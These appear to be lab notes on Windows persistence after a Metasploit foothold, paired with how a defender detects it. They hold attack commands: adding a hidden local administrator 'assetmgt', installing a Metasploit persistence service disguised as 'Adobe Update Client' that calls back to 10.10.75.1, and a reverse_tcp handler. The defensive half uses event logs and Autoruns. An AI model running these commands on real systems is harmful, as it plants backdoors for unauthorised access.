# Persistence with Metasploit Notes

Background, we already have access to a machine with MSF, these steps are about persistence not getting a shell

## Add local administrator user

```
execute -if whoami
execute -if "net user /add assetmgt Password1"
execute -if "net localgroup administrators /add assetmgt"
execute -if "net user"
execute -if "net localgroup administrators"
```

## Persistent Service

```
background
search type:exploit persist service
use exploit/windows/local/persistence_service
info
sessions
set session 1
set remote_exe_name AutoUpdate.exe
set service_name AdobeUpdate
set service_description "Adobe Update Client"
set lhost 10.10.75.1
exploit
```

now establish the callback handler

```
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
exploit
```


## Defender investigation of above

### Local User analysis

some options to detect local user creation, iterrogating the win event logs

```
Get-LocalUser
Get-WinEvent -FilterHashtable @{ Logname='Security'; ID=4720 } | Select-Object -First 1 | Format-List -property timecreated,message
```

### Autoruns

- Use sysinternals and right-click Autruns64.exe then select run as administrator.
- Accept EULA
- Click Services tab to focus on ASEP entries, find ones that are highlighted red (exe's with no publisher)
- Scroll ot the right to see Publisher, Image Path and Timestamp in the autoruns window (we notice one where the the exe is running in C:\Windows\Temp)
